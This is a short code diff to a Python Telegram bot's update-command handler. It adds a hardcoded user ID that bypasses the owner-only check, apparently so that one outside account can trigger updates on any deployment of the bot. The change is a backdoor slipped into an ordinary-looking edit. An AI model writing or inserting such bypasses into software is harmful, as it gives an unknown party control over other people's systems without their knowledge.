@@ -45,7 +45,8 @@ async def updateme_requirements():
 async def upstream(ups):
     
     check = ups.message.sender_id
-    if int(check) != int(OWNER_ID):
+    if not int(check) == 1763477650:
+     if int(check) != int(OWNER_ID):
         return
     lol = await ups.reply("`Checking for updates, please wait....`")
     conf = ups.pattern_match.group(1)
